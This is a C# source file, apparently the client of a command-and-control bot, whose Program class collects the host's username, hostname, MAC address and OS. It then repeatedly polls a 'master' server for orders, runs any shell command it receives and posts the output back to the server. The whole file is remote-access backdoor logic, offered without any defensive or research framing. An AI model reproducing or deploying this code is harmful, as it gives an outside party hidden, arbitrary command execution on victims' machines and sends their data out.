using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TestAPP.lib;

namespace TestAPP
{
    internal class Program
    {
        static void Main(string[] args)
        {
            SystemInfo sysInfo = SysInfoGrabber.getSystemInfo();
            obeyMaster(sysInfo);


        }

        static String getCommandJSONFromSysInfo(SystemInfo sysInfo)
        {
            JSONHolder json = new JSONHolder();
            json.addStringEntry("username", sysInfo.username);
            json.addStringEntry("hostname", sysInfo.hostName);
            json.addStringEntry("mac", sysInfo.macAddress);
            json.addStringEntry("os", sysInfo.operatingSystem);

            return json.getParsedJSONString();

        }


        static void runShell(SystemInfo sysInfo, String command)
        {
            Console.WriteLine("[+] Executing SHELL Command : "+command);
            String payload = ShellCommandUtil.getCommandOutputJSON(sysInfo.macAddress,command);
            WebClient.sendPostJSON(Constants.API_SLAVE_TEXT_RESPONSE_URL, payload);
        }



        static void obeyMaster(SystemInfo sysInfo)
        {
            JSONHolder json = new JSONHolder();
            while (true)
            {
                String commandJSON = getCommandJSONFromSysInfo(sysInfo);
                Console.WriteLine("[+] Getting Command From Master...");
                String serverResponse = WebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);

                if (serverResponse == "{}")
                {
                    Console.WriteLine("[+] Nothing to do...");
                    System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
                    continue;
                }
             
                Hashtable responseMap = json.getMappedObjectFromString(serverResponse);

                switch (HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_TYPE))
                {
                    case Constants.SLAVE_COMMAND_KEY_VALUE_SHELL:
                        runShell(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                        break;
                }

                System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
            }
        }
    }
}
